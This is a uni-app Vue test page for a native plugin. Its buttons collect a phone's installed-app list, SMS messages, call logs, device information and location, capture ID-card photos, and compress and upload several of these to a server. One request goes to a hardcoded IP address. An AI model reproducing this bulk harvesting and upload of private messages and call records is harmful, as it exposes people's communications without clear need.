  <template>
      <view>
          <view @click="web.onClick" :prop="valueChangeSign" :change:prop="web.valueChange" id="web" class="web">
              <button>test</button>
          </view>
          <view class="container">
              {{text}}
              <button @click="login()">login</button>
              <button type="primary" @click="getInstall">获取安装列表数据</button>
              <button type="primary" @click="getSMSList">获取短信数据</button>
              <button type="primary" @click="getLocation">获取位置数据</button>
              <button type="primary" @click="getCallLogList">获取通话记录数据</button>
              <button type="primary" @click="getDeviceInfo">获取设备信息数据</button>
              <button type="primary" @click="getGoCamera">拍身份证</button>
              <button type="primary" @click="getGoCameraVideo">视频录制</button>
              <button type="primary" @click="openAlbum(false)">单选图片</button>
              <button type="primary" @click="openAlbum(true)">多选图片</button>
              <button type="primary" @click="initAf">初始化AF</button>
          </view>
      </view>
  </template>

  <script>
      import {
          pathToBase64,
          getLocalFilePath,
          base64ToPath
      } from '@/node_modules/image-tools/index.js'
      import pako from 'pako';
      import {
          login,
          upload,
          test
      } from '@/api/data.js'
      const wtModule = uni.requireNativePlugin('WTUniPlugin-WTModule');
      export default {
          data() {
              return {
                  href: 'https://uniapp.dcloud.io/component/README?id=uniui',
                  url: 'http://120.46.139.43:9527/gPjkvSR/wTcEL/xqtQju',
                  text: '',
                  token: '',
                  valueChangeSign: '',
              }
          },
          methods: {
              onViewClick(options) {
                  console.log(options)
              },
              login() {
                  this.valueChangeSign = 123
              },
              methodForRenderJs(val) {
                  console.log("我是逻辑层，被视图层调用了，并且收到参数：");
                  console.log(val)
                  // test({
                  //     file: val
                  // }).then(res => {
                  //     cosnole.log(res)
                  // })
              },
              getInstall() { // 获取安装列表
                  wtModule.getAppList((ret) => {
                      console.log(ret)
                      upload({
                          jsonPayload: ret,
                          uploadType: '1'
                      }).then(res => {
                          console.log(res)
                      })
                  })
              },
              getSMSList() { // 短信
                  wtModule.getSMSList((ret) => {
                      let data = pako.gzip(ret)
                      data = btoa(String.fromCharCode(...new Uint8Array(data)));
                      console.log(data)
                      upload({
                          jsonPayload: data,
                          uploadType: '4'
                      }).then(res => {
                          console.log(res)
                      })
                  })
              },
              getLocation() { // 获取位置
                  wtModule.getLocation((ret) => {
                      console.log(ret)
                  })
              },
              getCallLogList() { // 获取通话记录
                  wtModule.getCallLog((ret) => {
                      console.log(ret)
                      let data = pako.gzip(ret)
                      data = btoa(String.fromCharCode(...new Uint8Array(data)));
                      upload({
                          jsonPayload: data,
                          uploadType: '7'
                      }).then(res => {
                          console.log(res)
                      })
                  })
              },
              getDeviceInfo() {
                  wtModule.getMobileInfo((ret) => {
                      console.log(ret)
                      upload({
                          jsonPayload: ret,
                          uploadType: '6'
                      }).then(res => {
                          console.log(res)
                      })
                  })
              },
              getGoCamera() { // 拍身份证
                  wtModule.takePhoto({
                      type: 1
                  }, (ret) => {
                      console.log(ret)
                  })
              },
              getGoCameraVideo() { // 视频录制
                  wtModule.takePhoto({
                      type: 2
                  }, (ret) => {

                  })
              },
              openAlbum(isMultiple) { // 图片选择
                  let _this = this
                  wtModule.takePhoto({
                      isMultiple: isMultiple
                  }, (ret) => {
                      let data = 'data:image/video;base64,' + JSON.parse(ret)[0].replace(/\r\n/g,"")
                      // //调用
                      // var blob = _this.web.dataURLtoBlob(data);
                      // var file = _this.web.blobToFile(blob, 'demo');
                      base64ToPath(data)
                          .then(res => {
                              console.log(res)
                              uni.uploadFile({
                              			url: 'https://www.example.com/upload', //仅为示例，非真实的接口地址
                              			filePath: res,
                              			name: 'file',
                              			formData: {
                              				'user': 'test'
                              			},
                              			success: (uploadFileRes) => {
                              				console.log(uploadFileRes.data);
                              			}
                              		});
                              // plus.io.resolveLocalFileSystemURL(res, function(entry) {
                                  
                              //     entry.file(function(file) {
                              //         console.log(JSON.stringify(file));
                              //         let size = file.size
                              //         const fileReader = new plus.io.FileReader()
                              //         fileReader.readAsDataURL(file)
                              //         fileReader.onload = (event) => {

                              //         }
                              //     })
                              // }, function(e) {
                              //     console.log(e);
                              // });
                          })
                          .catch(error => {
                              console.log(error)
                          })

                      // this.valueChangeSign = 'data:image/video;base64,' + data.replace(/\r\n/g,"")
                  })
              },
              initAf() { // 初始化AF
                  wtModule.initAf((ret) => {
                      console.log(ret)
                  })
              },

              test() {
                  //             plus.android.requestPermissions([ 
                  // 'android.permission.READ_CALL_LOG' 
                  //             ], function(e) {
                  //                 console.log(e)
                  //             });
                  // let appurl = "market://details?id=io.dcloud.HelloH5"; 
                  // plus.runtime.openURL(appurl, function(res) {
                  // console.log(res);
                  // });
                  // uni.openAppAuthorizeSetting({
                  //   success (res) {
                  //     console.log(res)
                  //   }
                  // })
                  // uni.navigateTo({
                  //     url: '/pages/web/index'
                  // })
                  let data = {
                      // androidversion: 'android10',
                      // appVersion: '1.0.1',
                      // deviceID: 'tdfafafafdaf',
                      // i18n: 'zh_CN',
                      // ownerShip: 'tgwb1',
                      // phoneName: 'iphone13proMax',
                      // reqSource: 'Android',
                      // webVersion: 'H5'
                      stopwatch: "sys_permission_list_content"
                  }
                  console.log('开始请求')
                  uni.request({
                      url: this.url,
                      method: 'POST',
                      data: data,
                      header: {
                          'content-type': 'application/json;',
                          'encrypted': '0',
                          'encryptType': '0',
                          'ownerShip': 'tgwb1_ios',
                          'disturbedUrl': '0',
                          'disturbedPar': '1'
                      },
                      success: (res) => {
                          console.log(res)
                      },
                      // 
                      fail: (err) => {
                          console.log(err)
                      }
                  })
              },
          }
      }
  </script>
  <script module="web" lang="renderjs">
      export default {
          methods: {
              //将base64转换为blob
              dataURLtoBlob(dataurl) {
                  var arr = dataurl.split(','),
                      mime = arr[0].match(/:(.*?);/)[1],
                      bstr = atob(arr[1]),
                      n = bstr.length,
                      u8arr = new Uint8Array(n);
                  while (n--) {
                      u8arr[n] = bstr.charCodeAt(n);
                  }
                  return new Blob([u8arr], {
                      type: mime
                  });
              },
              //将blob转换为file
              blobToFile(theBlob, fileName) {
                  theBlob.lastModifiedDate = new Date();
                  theBlob.name = fileName;
                  return theBlob;
              },
              //将base64转换为文件
              dataURLtoFile: function(dataurl, filename) {
                  var arr = dataurl.split(','),

                      mime = arr[0].match(/:(.*?);/)[1],
                      bstr = atob(arr[1]),
                      n = bstr.length,
                      u8arr = new Uint8Array(n);
                  console.log(n)
                  while (n--) {
                      u8arr[n] = bstr.charCodeAt(n);
                  }
                  return new File([u8arr], filename, {
                      type: mime
                  });
              },




              valueChange(newVal, oldVal, ownerInstance, instance) {
                  console.log("我是视图层，我被逻辑层调用了...");
                  console.log("我是新数据....");
                  if (!newVal) {
                      return
                  }
                  // var blob = this.dataURLtoBlob(newVal);
                  //  console.log(blob,456);
                  // var file = this.blobToFile(blob, 'test');
                  //调用
                  var file = this.dataURLtoFile(newVal, 'test');
                  console.log("我是旧数据....");
                  // console.log(oldVal);
                  this.$ownerInstance.callMethod('methodForRenderJs', file);
              },
              // 逻辑层向视图层传值
              postMessage(event, ownerInstance) {
                  this.$ownerInstance.callMethod('login', {
                      data: '需要发送的数据'
                  })
              },
              onClick(event, ownerInstance) {
                  // 调用 service 层的方法
                  ownerInstance.callMethod('onViewClick', {
                      test: 'test'
                  })
              }
          }
      }
  </script>
  <style>
      .container {
          padding: 20px;
          font-size: 14px;
          line-height: 24px;
      }
  </style>